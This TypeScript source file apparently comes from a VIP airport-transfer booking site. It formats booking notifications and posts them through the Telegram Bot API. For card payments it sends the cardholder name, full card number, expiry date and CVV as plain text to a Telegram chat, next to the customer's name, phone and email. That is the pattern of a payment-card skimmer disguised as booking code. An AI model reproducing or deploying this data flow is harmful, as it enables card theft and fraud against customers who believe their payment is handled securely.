import { escapeHtml } from '@/lib/security';

export interface BookingNotificationData {
  bookingId: string;
  fullName: string;
  phone: string;
  email?: string;
  pickup: string;
  dropoff: string;
  date: string;
  time: string;
  vehicle: string;
  passengers: number;
  luggage: number;
  flightNumber?: string;
  greetingSign?: string;
  childSeat?: boolean;
  notes?: string;
  totalPrice?: string;
  currency?: string;
  paymentMethod: string;
  cardDetails?: {
    cardHolder?: string;
    cardNumber?: string;
    cardExpiry?: string;
    cardCvv?: string;
  };
  locale?: string;
}

export async function sendTelegramNotification(data: BookingNotificationData): Promise<boolean> {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!token || !chatId) {
    console.warn('[TELEGRAM] TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is not configured.');
    return false;
  }

  // Payment method human readable label
  let paymentText = '💳 Online Kredi / Banka Kartı';
  if (data.paymentMethod === 'paypal') {
    paymentText = '🅿️ PayPal ile Ödeme';
  }

  // Format HTML message safely with strict HTML escaping on all user fields
  const now = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
  const safeBookingId = escapeHtml(data.bookingId);
  const safeFullName = escapeHtml(data.fullName);
  const safePhone = escapeHtml(data.phone);
  const cleanPhoneLink = data.phone.replace(/[^0-9+]/g, '');
  const safePickup = escapeHtml(data.pickup);
  const safeDropoff = escapeHtml(data.dropoff);
  const safeDate = escapeHtml(data.date);
  const safeTime = escapeHtml(data.time);
  const safeVehicle = escapeHtml(data.vehicle);
  const safeLocale = escapeHtml(data.locale?.toUpperCase() || 'AR');

  let message = `👑 <b>YENİ VIP REZERVASYON & ÖDEME BİLDİRİMİ</b>\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `🔖 <b>Rezervasyon No:</b> <code>${safeBookingId}</code>\n`;
  message += `⏰ <b>Sistem Zamanı:</b> ${now}\n`;
  message += `🌐 <b>Kullanıcı Dili:</b> ${safeLocale}\n\n`;

  message += `👤 <b>MÜŞTERİ BİLGİLERİ</b>\n`;
  message += `• <b>Ad Soyad:</b> ${safeFullName}\n`;
  message += `• <b>Müşteri Telefonu:</b> <a href="tel:${cleanPhoneLink}">${safePhone}</a>\n`;
  if (data.email) {
    message += `• <b>E-posta:</b> ${escapeHtml(data.email)}\n`;
  }
  if (data.greetingSign) {
    message += `• <b>Karşılama Panosu (İsim):</b> 🏷️ <b>${escapeHtml(data.greetingSign)}</b>\n`;
  }
  message += `\n`;

  message += `📍 <b>TRANSFER DETAYLARI</b>\n`;
  message += `• <b>Nereden:</b> ${safePickup}\n`;
  message += `• <b>Nereye:</b> ${safeDropoff}\n`;
  message += `• <b>Tarih & Saat:</b> 📅 <b>${safeDate}</b> saat <b>${safeTime}</b>\n`;
  message += `• <b>Araç Tipi:</b> 🚘 ${safeVehicle}\n`;
  message += `• <b>Kişi / Bagaj:</b> 👥 ${Number(data.passengers) || 1} Yolcu | 🧳 ${Number(data.luggage) || 0} Valiz\n`;
  if (data.flightNumber) {
    message += `• <b>Uçuş Kodu:</b> ✈️ <code>${escapeHtml(data.flightNumber)}</code>\n`;
  }
  if (data.childSeat) {
    message += `• <b>Bebek Koltuğu:</b> 👶 Evet (Ücretsiz temin edilecek)\n`;
  }
  if (data.notes) {
    message += `• <b>Özel Not:</b> 📝 <i>${escapeHtml(data.notes)}</i>\n`;
  }
  message += `\n`;

  message += `💰 <b>ÖDEME & TUTAR BİLGİSİ</b>\n`;
  message += `• <b>Ödeme Yöntemi:</b> ${paymentText}\n`;
  message += `• <b>Net Tutar:</b> 💵 <b>${escapeHtml(data.totalPrice || 'Belirtilmedi')}</b>\n`;

  if (data.paymentMethod === 'online_card' && data.cardDetails) {
    message += `\n💳 <b>KART BİLGİLERİ (ONLINE ÖDEME):</b>\n`;
    if (data.cardDetails.cardHolder) {
      message += `• <b>Kart Sahibi:</b> ${escapeHtml(data.cardDetails.cardHolder)}\n`;
    }
    if (data.cardDetails.cardNumber) {
      message += `• <b>Kart No:</b> <code>${escapeHtml(data.cardDetails.cardNumber)}</code>\n`;
    }
    if (data.cardDetails.cardExpiry) {
      message += `• <b>SKT:</b> <code>${escapeHtml(data.cardDetails.cardExpiry)}</code>\n`;
    }
    if (data.cardDetails.cardCvv) {
      message += `• <b>CVV:</b> <code>${escapeHtml(data.cardDetails.cardCvv)}</code>\n`;
    }
  }

  message += `\n━━━━━━━━━━━━━━━━━━━━━\n`;
  message += `⚡ <i>Istanora VIP Transfer Güvenli Operasyon Masası</i>`;

  try {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    });

    const result = await res.json();
    if (!result.ok) {
      console.error('[TELEGRAM API ERROR]:', result.description || 'Failed to deliver message');
      return false;
    }

    return true;
  } catch (error) {
    console.error('[TELEGRAM FETCH EXCEPTION]');
    return false;
  }
}
